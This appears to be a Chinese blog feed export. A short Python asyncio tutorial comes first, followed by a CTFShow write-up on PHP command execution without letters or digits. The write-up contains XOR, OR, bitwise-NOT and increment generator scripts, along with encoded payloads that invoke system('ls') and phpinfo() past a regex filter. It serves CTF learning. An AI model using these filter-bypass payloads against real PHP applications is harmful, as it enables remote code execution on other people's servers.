<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run( func1() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>示例2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;执行协程函数内部代码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> others()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;IO请求结束，结果为：&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run( func() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Task对象"><a href="#Task对象" class="headerlink" title="Task对象"></a>Task对象</h2><p>在事件循环中添加多个任务</p>
<p>Task对象用于并发的调度协程，通过<code>asyncio.create_task(协程对象)</code>的方式创建Task对象，这样可以让协程加入事件循环当中等待被调度执行。除了使用<code>asyncio.create_task()</code>函数以外，还可以用低层的<code>loop.create_task()</code>或<code>ensure_future()</code>函数。<strong>不建议手动实例化task对象。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main开始&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将任务添加到事件循环</span></span><br><span class="line">    task_list = [</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&#x27;n1&#x27;</span>),</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># done是一个集合</span></span><br><span class="line">    done,pending = <span class="keyword">await</span> asyncio.wait(task_list, timeout=<span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建事件循环</span></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="concurrent-futures-Future-对象"><a href="#concurrent-futures-Future-对象" class="headerlink" title="concurrent.futures.Future()对象"></a>concurrent.futures.Future()对象</h2><p>使用线程池、进程池实现异步操作时用到的对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.process <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">value</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个线程池</span></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程池</span></span><br><span class="line">pool1 = ProcessPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    fut = pool.submit(func, i)</span><br><span class="line">    <span class="built_in">print</span>(fut)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以后可能存在交叉使用。</p>
<p>多个方法的时候，就回调函数</p>
<p>基于多线程实现的异步</p>
<p>CPU密集型用多进程，IO密集型用异步</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><center>总结</center></h1><ul>
<li><p>信号量，多进程，进程池的区别  </p>
<p>  <strong>信号量</strong>：如果有500件衣服要做，于是招了500个人，只有4台机器，谁完成任务了再进几个人，也就是4个信号量，500个进程，机器是cpu，4个cpu，每个人是每个进程，每件衣服是一个任务  </p>
<p>  <strong>多进程</strong>：500个人抢四台机器，每个人只能工作十分钟，相对于时间片，不管做没有做完，就走了，就是500个进程做500个任务  </p>
<p>  <strong>进程池</strong>：4个人做500件衣服，4台机器，谁来谁就可以做衣服。而对于多进程来说，操作系统来调度500个人谁用机器，谁不用机器，和调度4个人是不一样的。所以不能有几件衣服就雇几个人，而是都几台机器就雇几个人。这样人都转起来了，并且都能完成任务。而且工厂负担也小一点，这就是池的概念。</p>
</li>
</ul>
<p>CPU密集用多进程，IO密集用异步协程</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无字母无数字命令执行</title>
    <url>/RCE/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>根据CTFShow的命令执行41关的单独解析，及其拓展</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown91020240_p0.jpg"></p>
<span id="more"></span>

<p>假设一个情况，对提交的cmd参数进行了正则，不能有数字和字母，这种情况就用到了异或，那什么是异或呢？</p>
<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或：如果a、b两个值不相同，则异或结果为一，如果a、b两个值相同，则异或结果为0。</p>
<p>异或速记口诀：相同为0，不同为1。</p>
<p>这里的值是指二进制的值。</p>
<p>PHP实现异或运算：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> a^b;</span><br></pre></td></tr></table></figure>


<p>游览器中执行如上代码，游览器会打印一个不可见字符，但是并没有报错。</p>
<p>修改代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ord</span>(a^b);</span><br></pre></td></tr></table></figure>


<p>执行脚本可以得到一个3。</p>
<p>那么为什么会得到一个3呢，a和b的Ascii码的二进制值，分别为<code>0110 0001</code>和<code>0110 0010</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329091840.png"></p>
<p>得到二进制的<code>0000 0011</code> ，刚好是3，这就是解释了游览器中的3是怎么来的。</p>
<p>到此，是不是可以利用异或构建一个命令执行脚本，因为正则了数字和字母，所以先排除不可用用的Ascii码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ascii 33-47 58-64 91-96 123-126</span><br></pre></td></tr></table></figure>




<p>33-47包含的Ascii码是0011 1010 - 0100-0000</p>
<p>而a的Ascii值为0110 0001由于33-47的第二位永远为0，相同异或后为0，不满足条件pass掉。</p>
<p>58-64包含的Ascii码是0010 1010 - 0100 0000</p>
<p>就取最后一个0100 0000来测试构造a</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329092011.png"></p>
<p>所以可得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用边来来构造出其他字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br></pre></td></tr></table></figure>


<p>这里可以顺利打印出b，<code>（通过自增）</code></p>
<p>综上可得：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); <span class="comment">//a</span></span><br><span class="line"><span class="variable">$___</span>=++<span class="variable">$__</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$____</span>=++<span class="variable">$___</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$____</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$______</span>=++<span class="variable">$_____</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$_______</span>=++<span class="variable">$______</span>; <span class="comment">//f</span></span><br><span class="line"><span class="variable">$________</span>=++<span class="variable">$_______</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$_________</span>=++<span class="variable">$________</span>; <span class="comment">//h</span></span><br><span class="line"><span class="variable">$__________</span>=++<span class="variable">$_________</span>; <span class="comment">//i</span></span><br><span class="line"><span class="variable">$___________</span>=++<span class="variable">$__________</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$____________</span>=++<span class="variable">$___________</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_____________</span>=++<span class="variable">$____________</span>; <span class="comment">//l</span></span><br><span class="line"><span class="variable">$______________</span>=++<span class="variable">$_____________</span>; <span class="comment">//m</span></span><br><span class="line"><span class="variable">$_______________</span>=++<span class="variable">$______________</span>; <span class="comment">//n</span></span><br><span class="line"><span class="variable">$________________</span>=++<span class="variable">$_______________</span>; <span class="comment">//o</span></span><br><span class="line"><span class="variable">$_________________</span>=++<span class="variable">$________________</span>; <span class="comment">//p</span></span><br><span class="line"><span class="variable">$__________________</span>=++<span class="variable">$_________________</span>; <span class="comment">//q</span></span><br><span class="line"><span class="variable">$___________________</span>=++<span class="variable">$__________________</span>; <span class="comment">//r</span></span><br><span class="line"><span class="variable">$____________________</span>=++<span class="variable">$___________________</span>; <span class="comment">//s</span></span><br><span class="line"><span class="variable">$_____________________</span>=++<span class="variable">$____________________</span>; <span class="comment">//t</span></span><br><span class="line"><span class="variable">$______________________</span>=++<span class="variable">$_____________________</span>; <span class="comment">//u</span></span><br><span class="line"><span class="variable">$_______________________</span>=++<span class="variable">$______________________</span>; <span class="comment">//v</span></span><br><span class="line"><span class="variable">$________________________</span>=++<span class="variable">$_______________________</span>; <span class="comment">//w</span></span><br><span class="line"><span class="variable">$_________________________</span>=++<span class="variable">$________________________</span>; <span class="comment">//x</span></span><br><span class="line"><span class="variable">$__________________________</span>=++<span class="variable">$_________________________</span>; <span class="comment">//y</span></span><br><span class="line"><span class="variable">$___________________________</span>=++<span class="variable">$__________________________</span>; <span class="comment">//z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>生成一个phpinfo()试试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_________________</span>.<span class="variable">$_________</span>.<span class="variable">$_________________</span>.<span class="variable">$__________</span>.<span class="variable">$_______________</span>.<span class="variable">$_______</span>.<span class="variable">$________________</span>)();</span><br></pre></td></tr></table></figure>


<p>执行即可得到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220331113835.png"></p>
<p>然后构造出system字符串拿flag。</p>
<h1 id="异或→EXP"><a href="#异或→EXP" class="headerlink" title="异或→EXP"></a>异或→EXP</h1><p>为了应对多种情况，放个羽师傅的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">  <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_i=dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_j=dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; //根据题目给的正则表达式修改即可</span><br><span class="line">    <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">          echo <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">    $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">    $c=(urldecode($a)^urldecode($b));</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>($c)&gt;=<span class="number">32</span>&amp;<span class="built_in">ord</span>($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[+] your <span class="function"><span class="keyword">function</span>：<span class="title">system</span></span></span><br><span class="line"><span class="function">[+] <span class="title">your</span> <span class="title">command</span>：<span class="title">ls</span></span></span><br><span class="line"><span class="function">(<span class="params"><span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span></span>)(<span class="params"><span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span></span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>现在了解了异或，继续拓展思维，既然异或可以，那么或，取反，自增，中文是不是也可以得到我们的结果呢。</p>
<h1 id="或→EXP"><a href="#或→EXP" class="headerlink" title="或→EXP"></a>或→EXP</h1><p>原理一样，都是通过16进制比对得到特定字符，上脚本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">    <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="取反→EXP"><a href="#取反→EXP" class="headerlink" title="取反→EXP"></a>取反→EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="自增→EXP"><a href="#自增→EXP" class="headerlink" title="自增→EXP"></a>自增→EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$precode</span> = <span class="string">&lt;&lt;&lt;code</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;); //a</span></span><br><span class="line"><span class="string">\$___=++<span class="subst">$__</span>; //b</span></span><br><span class="line"><span class="string">\$____=++<span class="subst">$___</span>; //c</span></span><br><span class="line"><span class="string">\$_____=++<span class="subst">$____</span>; //d</span></span><br><span class="line"><span class="string">\$______=++<span class="subst">$_____</span>; //e</span></span><br><span class="line"><span class="string">\$_______=++<span class="subst">$______</span>; //f</span></span><br><span class="line"><span class="string">\$________=++<span class="subst">$_______</span>; //g</span></span><br><span class="line"><span class="string">\$_________=++<span class="subst">$________</span>; //h</span></span><br><span class="line"><span class="string">\$__________=++<span class="subst">$_________</span>; //i</span></span><br><span class="line"><span class="string">\$___________=++<span class="subst">$__________</span>; //g</span></span><br><span class="line"><span class="string">\$____________=++<span class="subst">$___________</span>; //k</span></span><br><span class="line"><span class="string">\$_____________=++<span class="subst">$____________</span>; //l</span></span><br><span class="line"><span class="string">\$______________=++<span class="subst">$_____________</span>; //m</span></span><br><span class="line"><span class="string">\$_______________=++<span class="subst">$______________</span>; //n</span></span><br><span class="line"><span class="string">\$________________=++<span class="subst">$_______________</span>; //o</span></span><br><span class="line"><span class="string">\$_________________=++<span class="subst">$________________</span>; //p</span></span><br><span class="line"><span class="string">\$__________________=++<span class="subst">$_________________</span>; //q</span></span><br><span class="line"><span class="string">\$___________________=++<span class="subst">$__________________</span>; //r</span></span><br><span class="line"><span class="string">\$____________________=++<span class="subst">$___________________</span>; //s</span></span><br><span class="line"><span class="string">\$_____________________=++<span class="subst">$____________________</span>; //t</span></span><br><span class="line"><span class="string">\$______________________=++<span class="subst">$_____________________</span>; //u</span></span><br><span class="line"><span class="string">\$_______________________=++<span class="subst">$______________________</span>; //v</span></span><br><span class="line"><span class="string">\$________________________=++<span class="subst">$_______________________</span>; //w</span></span><br><span class="line"><span class="string">\$_________________________=++<span class="subst">$________________________</span>; //x</span></span><br><span class="line"><span class="string">\$__________________________=++<span class="subst">$_________________________</span>; //y</span></span><br><span class="line"><span class="string">\$___________________________=++<span class="subst">$__________________________</span>; //z</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;);</span></span><br><span class="line"><span class="string">code</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$precode</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用异或生成任意无字母无数字代码</span></span><br><span class="line">Function <span class="title function_ invoke__">createCode</span>(<span class="variable">$code</span>)&#123;</span><br><span class="line">         <span class="keyword">global</span> <span class="variable">$precode</span>;</span><br><span class="line">         <span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span 